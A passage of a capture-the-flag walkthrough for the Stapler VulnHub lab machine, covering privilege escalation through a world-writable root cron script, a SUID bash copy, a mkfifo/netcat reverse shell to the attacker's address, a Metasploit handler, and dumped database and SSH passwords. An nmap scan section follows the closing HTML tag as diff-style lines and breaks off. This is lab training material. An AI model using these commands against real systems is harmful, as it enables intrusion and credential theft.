started python's SimpleHTTPServer module so I can upload the script to the victim's /var/www/https/blogblog/wp-content/uploads directory and run it in the background. That way if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:/var/www/https/blogblog/wp-content/uploads$ wget -O thumbs 10.183.0.222:4321/thumbs     </div><div>--2019-04-20 00:55:31--  http://10.183.0.222:4321/thumbs</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 307 [application/octet-stream]</div><div>Saving to: 'thumbs'</div><div><div><br/></div></div><div>thumbs              100%[===================&gt;]     307  --.-KB/s    in 0s      </div><div><div><br/></div></div><div>2019-04-20 00:55:31 (60.5 MB/s) - 'thumbs' saved [307/307]</div><div><div><br/></div></div><div>www@red:/var/www/https/blogblog/wp-content/uploads$ chmod +x thumbs</div><div>www@red:/var/www/https/blogblog/wp-content/uploads$ ./thumbs &amp;</div><div>[1] 25361</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>We check the operating system info using uname.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:~$ uname -a</div><div>Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</div></div><div><br/></div><div>Looks like the exploit database has a known exploit for this version of Ubuntu + kernel... unfortunately... our victim is running x86 and this exploit is for x64.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation        | exploits/linux_x86-64/local/40049.c</div></div><div><br/></div><div>We have another couple of exploits that might work...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                       | exploits/linux/local/44298.c</div><div>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)        | exploits/linux/local/43418.c</div></div><div><br/></div><div>...but they don't... at least not without some more work.</div><div><br/></div><div>Looking around in /usr/local, I notice there is a script that has wide open permissions.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:/usr/local/sbin$ cat cron-logrotate.sh</div><div>#Simon, you really need to-do something about this</div><div>www@red:/usr/local/sbin$ ls -l</div><div>total 4</div><div>-rwxrwxrwx 1 root root 51 Jun  3  2016 cron-logrotate.sh</div></div><div><br/></div><div>Jumping back to /etc, I did a search to see if root ever executes this file (since I can edit it).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:/etc$ grep -ri 'cron-logrotate' * 2&gt;&amp;1 | grep -v "Permission denied"</div><div>cron.d/logrotate:*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh</div></div><div><br/></div><div>Nice. Root runs this script (that I can edit) every 5 minutes. This should be easy.</div><div><br/></div><div>I'll create a file with the commands I want root to run for me. I'll even leave the original comment in the file. This should copy /bin/bash to /tmp and then set the sticky bit so any user can run it as root. I'll also go ahead and have a reverse shell connect back to my attacker (since the cron job runs every 5 mins, this is also another way to 'Maintain Access').</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# cat cron-logrotate.sh</div><div>#Simon, you really need to-do something about this</div><div>cp /bin/bash /tmp</div><div>chmod u+s /tmp/bash</div><div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.183.0.222 5434 &gt;/tmp/f</div></div><div><br/></div><div>Now I'll start the python SimpleHTTPServer like before and pull down the file to the victim (overwriting the original).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:/usr/local/sbin$ wget -O cron-logrotate.sh 10.183.0.222:4321/cron-logrotate.sh</div><div>--2019-04-20 01:46:06--  http://10.183.0.222:4321/cron-logrotate.sh</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 89 [text/x-sh]</div><div>Saving to: 'cron-logrotate.sh'</div><div><div><br/></div></div><div>cron-logrotate.sh   100%[===================&gt;]      89  --.-KB/s    in 0s      </div><div><div><br/></div></div><div>utime(cron-logrotate.sh): Operation not permitted</div><div>2019-04-20 01:46:06 (20.0 MB/s) - 'cron-logrotate.sh' saved [89/89]</div></div><div><br/></div><div>Now we wait until bash shows up in /tmp. We can also set up a listener in Metasploit for our reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5434</div><div>LPORT =&gt; 5434</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 4.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5434</div></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:/tmp$ ls -l</div><div>total 1084</div><div>-rwsr-xr-x 1 root root 1109564 Apr 20 01:50 bash</div></div><div><br/></div><div>Now that our SUID enabled bash is in /tmp, all we have to do is run it with the -p option.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www@red:/tmp$ ./bash -p</div><div>bash-4.3# id</div><div>uid=1028(www) gid=1028(www) euid=0(root) groups=1028(www)</div></div><div><br/></div><div>Why does this work? What does '-p' mean? From the bash man page.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>If  the  shell  is  started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no</div><div>startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE  variables,</div><div>if  they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at in‐</div><div>vocation, the startup behavior is the same, <span style="font-weight: bold; text-decoration: underline;">but the effective user id is not reset</span>.</div></div><div><br/></div><div>As you can see from the output of the 'id' command, the effective user id (euid) is 0 (root).</div><div><br/></div><div>All that's left to do now is get the flag from /root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.3# cd /root</div><div>bash-4.3# cat flag.txt</div><div>~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~</div><div>                          .-'''''-.</div><div>                          |'-----'|</div><div>                          |-.....-|</div><div>                          |       |</div><div>                          |       |</div><div>         _,._             |       |</div><div>    __.o`   o`"-.         |       |</div><div> .-O o `"-.o   O )_,._    |       |</div><div>( o   O  o )--.-"`O   o"-.`'-----'`</div><div> '--------'  (   o  O    o)  </div><div>              `----------`</div><div>b6b545dc11b7a270f4bad23432190c75162c4a2b</div></div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** REMOVE /home/www/rev.php ***</div><div>*** STOP /var/www/https/blogblog/wp-content/uploads/thumbs ***</div><div>*** REMOVE /var/www/https/blogblog/wp-content/uploads/thumbs ***</div><div>*** CLEAN OUT /usr/local/sbin/cron-logrotate.sh ***</div><div>*** REMOVE /tmp/bash ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">WordPress DB Creds</span></div><div><br/></div><div>We were able to obtain the wordpress database credentials from the wp-config.php file in /var/www/https/blogblog.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>[...]</div><div>// ** MySQL settings - You can get this info from your web host ** //</div><div>/** The name of the database for WordPress */</div><div>define('DB_NAME', 'wordpress');  </div><div><div><br/></div></div><div>/** MySQL database username */   </div><div>define('DB_USER', 'root');</div><div><div><br/></div></div><div>/** MySQL database password */   </div><div>define('DB_PASSWORD', 'plbkac');</div><div><div><br/></div></div><div>/** MySQL hostname */</div><div>define('DB_HOST', 'localhost');</div><div>[...]</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">phpMyAdmin DB Creds</span></div><div><br/></div><div>We are able to obtain the phpmyadmin database credentials from the config-db.php file in /etc/phpmyadmin.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>bash-4.3# cd /etc/phpmyadmin</div><div>bash-4.3# cat config-db.php</div><div>&lt;?php</div><div>##</div><div>## database access settings in php format</div><div>## automatically generated from /etc/dbconfig-common/phpmyadmin.conf</div><div>## by /usr/sbin/dbconfig-generate-include</div><div>##</div><div>## by default this file is managed via ucf, so you shouldn't have to</div><div>## worry about manual changes being silently discarded.  *however*,</div><div>## you'll probably also want to edit the configuration file mentioned</div><div>## above too.</div><div>##</div><div>$dbuser='phpmyadmin';</div><div>$dbpass='FbvmqOhR4Z5y';</div><div>$basepath='';</div><div>$dbname='phpmyadmin';</div><div>$dbserver='localhost';</div><div>$dbport='';</div><div>$dbtype='mysql';</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">TCP port 666</span></div><div><br/></div><div>We notice that nmap reported lots of junk from the service on TCP port 666. Let's use netcat to catch the binary data being spewed on this port and see what it might be.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# nc 10.183.0.194 666 &gt; binary</div><div>root@kali:~/Walkthroughs/stapler# vim binary</div></div><div><br/></div><div>Opening the file in vim, we notice the first characters are 'PK', which typically indicates a ZIP file. We add the '.zip' extension and run zipinfo to see what we've got.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# mv binary binary.zip</div><div>root@kali:~/Walkthroughs/stapler# zipinfo binary.zip </div><div>Archive:  binary.zip</div><div>Zip file size: 11608 bytes, number of entries: 1</div><div>-rw-r--r--  3.0 unx    12821 bx defX 16-Jun-03 11:03 message2.jpg</div><div>1 file, 12821 bytes uncompressed, 11434 bytes compressed:  10.8%</div></div><div><br/></div><div>We extract message2.jpg and this is what we get.</div><div><br/></div><div><img height="77" src="/assets/images/2019-04-15-stapler/message2.jpg" width="364"/><br/></div><div><br/></div><div>Scott is a WordPress user.</div><div><br/></div><div>We also check the exif data in the image.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/stapler# exiftool message2.jpg </div><div>ExifTool Version Number         : 11.16</div><div>File Name                       : message2.jpg</div><div>Directory                       : .</div><div>File Size                       : 13 kB</div><div>File Modification Date/Time     : 2016:06:03 11:03:07-04:00</div><div>File Access Date/Time           : 2019:04:19 17:01:52-04:00</div><div>File Inode Change Date/Time     : 2019:04:19 17:01:11-04:00</div><div>File Permissions                : rw-r--r--</div><div>File Type                       : JPEG</div><div>File Type Extension             : jpg</div><div>MIME Type                       : image/jpeg</div><div>JFIF Version                    : 1.01</div><div>Resolution Unit                 : None</div><div>X Resolution                    : 72</div><div>Y Resolution                    : 72</div><div>Current IPTC Digest             : 020ab2da2a37c332c141ebf819e37e6d</div><div>Contact                         : If you are reading this, you should get a cookie!</div><div>Application Record Version      : 4</div><div>IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e</div><div>Image Width                     : 364</div><div>Image Height                    : 77</div><div>Encoding Process                : Baseline DCT, Huffman coding</div><div>Bits Per Sample                 : 8</div><div>Color Components                : 3</div><div>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</div><div>Image Size                      : 364x77</div><div>Megapixels                      : 0.028</div></div><div><br/></div><div>This Contact field comment plus Scott being mentioned in the image ties together something we already know (through brute force). Scott's WordPress password is 'cookie'.</div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">phpMyAdmin Setup</span></div><div><br/></div><div>The phpMyAdmin Setup site is available here: <a href="https://10.183.0.194:12380/phpmyadmin/setup">https://10.183.0.194:12380/phpmyadmin/setup</a></div><div><br/></div><div>The /etc/phpmyadmin/htpasswd.setup file contains the following.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@red:/etc/phpmyadmin# cat htpasswd.setup</div><div>admin:*</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">JKanode</span></div><div><br/></div><div>Looking in the /root directory, there is a python.sh script that appears to be starting python's SimpleHTTPServer on TCP port 8888. That port wasn't open in our nmap scan and we can't connect to it because it is being redirected to /dev/null (intentionally or unintentionally). Regardless, we see that it is serving files out of /home/JKanode. That makes that directory interesting. Taking a look there, we only see hidden bash related files, but the .bash_history file has some interesting entries. In fact, it has SSH credentials for two users (JKanode and peter). We've seen that Peter is an admin on the WordPress site and was listed in the SMB users as well. We also saw that his account is in many 'admin' groups in /etc/group. So, that's a nice account to have credentials for... even though we already have root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@red:~# cat python.sh</div><div>#!/bin/bash</div><div>su -c 'cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &amp;&gt;/dev/null' JKanode &amp;&gt;/dev/null</div><div>root@red:~# cd /home/JKanode</div><div>root@red:/home/JKanode# ls -a</div><div>.</div><div>..</div><div>.bash_history</div><div>.bash_logout</div><div>.bashrc</div><div>.profile</div><div>root@red:/home/JKanode# cat .bash_history</div><div>cat .bash_history</div><div>id</div><div>whoami</div><div>ls -lah</div><div>pwd</div><div>ps aux</div><div>sshpass -p thisimypassword ssh JKanode@localhost</div><div>apt-get install sshpass</div><div>sshpass -p JZQuyIN5 peter@localhost</div><div>ps -ef</div><div>top</div><div>kill -9 3747</div><div>exit</div></div><div><br/></div><div>Logging in as (via SSH) as Peter, we can see all the permissions his account has.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>red% id</div><div>uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</div></div><div><br/></div><div>Seeing sudo in the list, we decide to see what Peter can do using sudo...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>red% sudo -l</div><div><div><br/></div></div><div>We trust you have received the usual lecture from the local System</div><div>Administrator. It usually boils down to these three things:</div><div><div><br/></div></div><div>    #1) Respect the privacy of others.</div><div>    #2) Think before you type.</div><div>    #3) With great power comes great responsibility.</div><div><div><br/></div></div><div>[sudo] password for peter: </div><div>Matching Defaults entries for peter on red:</div><div>    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</div><div><div><br/></div></div><div>User peter may run the following commands on red:</div><div>    (ALL : ALL) ALL</div></div><div><br/></div><div>Anything he wants! If we didn't already have root, this would be a way to get it.</div><div><br/></div></body></html>
+<div>VulnHub URL: <a href="https://www.vulnhub.com/entry/stapler-1,150/" target="_blank">https://www.vulnhub.com/entry/stapler-1,150/</a></div>
+<div>Hostname: red.initech</div>
+<div>IP Address: 10.183.0.194</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Information Gathering/Recon</h2>
+</div>
+<div><br /></div>
+<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.194.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Service Enumeration/Scanning</h2>
+</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# nmap -Pn -sT -sV -A -oA stapler -p 1-65535 10.183.0.194</div>
+    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-19 00:01 EDT</div>
+    <div>Nmap scan report for red.initech.homenet.dom (10.183.0.194)</div>
+    <div>Host is up (0.0029s latency).</div>
+    <div>Not shown: 65523 filtered ports   </div>
+    <div>PORT      STATE  SERVICE     VERSION</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">20/tcp    closed ftp-data</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">21/tcp    open   ftp         vsftpd 2.0.8 or later</font>
+    </div>
+    <div>| ftp-anon: Anonymous FTP login allowed (FTP code 230)</div>
+    <div>|_Can't get directory listing: PASV failed: 550 Permission denied.</div>
+    <div>| ftp-syst:</div>
+    <div>|   STAT:</div>
+    <div>| FTP server status:</div>
+    <div>|      Connected to 10.183.0.222  </div>
+    <div>|      Logged in as ftp</div>
+    <div>|      TYPE: ASCII</div>
+    <div>|      No session bandwidth limit </div>
+    <div>|      Session timeout in seconds is 300</div>
+    <div>|      Control connection is plain text</div>
+    <div>|      Data connections will be plain text</div>
+    <div>|      At session startup, client count was 3</div>
+    <div>|      <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">vsFTPd 3.0.3</font> - secure, fast, stable</div>
+    <div>|_End of status</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</font>
+    </div>
+    <div>| ssh-hostkey:</div>
+    <div>|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)</div>
+    <div>|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)</div>
+    <div>|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">53/tcp    open   domain      dnsmasq 2.75</font>
+    </div>
+    <div>| dns-nsid:</div>
+    <div>|_  bind.version: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">dnsmasq-2.75</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp    open   http        PHP cli server 5.5 or later</font>
+    </div>
+    <div>|_http-title: 404 Not Found</div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">123/tcp   closed ntp</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">137/tcp   closed netbios-ns</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">138/tcp   closed netbios-dgm</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)</font>
+    </div>
+    <div>
+        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">666/tcp   open   doom?</font>
+    </div>
+    <div>
+        <div>| fingerprint-strings:</div>
+        <div>|   NULL:</div>
+        <div>|     message2.jpgUT</div>
+        <div>|     QWux</div>
+        <div>|     "DL[E</div>
+        <div>|     #;3[</div>
+        <div>|     \xf6</div>
+        <div>|     u([r</div>
+        <div>|     qYQq</div>
+        <div>|     Y_?n2</div>
+        <div>|     3&amp;M~{</div>
+        <div>|     9-a)T</div>
+        <div>|     L}AJ</div>
+        <div>|_    .npy.9</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1</font>
+        </div>
+        <div>| mysql-info:</div>
+        <div>|   Protocol: 10</div>
+        <div>|   Version: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">5.7.12-0ubuntu1</font>
+        </div>
+        <div>|   Thread ID: 8</div>
+        <div>|   Capabilities flags: 63487</div>
+        <div>|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SupportsCompression, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</div>
+        <div>|   Status: Autocommit</div>
+        <div>|   Salt: k\x0E+</div>
+        <div>|       U%\x1F&gt;)Te\x7F8}\x04QD\x165</div>
+        <div>|_  Auth Plugin Name: 88</div>
+        <div>
+            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))</font>
+        </div>
+        <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
+        <div>|_http-title: Site doesn't have a title (text/html).</div>
+        <div>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</div>
+        <div>
+            <div>SF-Port666-TCP:V=7.70%I=7%D=4/19%Time=5CB94895%P=x86_64-pc-linux-gnu%r(NUL</div>
+            <div>SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1</div>
+            <div>SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0</div>
+            <div>SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa</div>
+            <div>SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\</div>
+            <div>SF:x0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x</div>
+            <div>SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu</div>
+            <div>SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd</div>
+            <div>SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa</div>
+            <div>SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x</div>
+            <div>SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x</div>
+            <div>SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x</div>
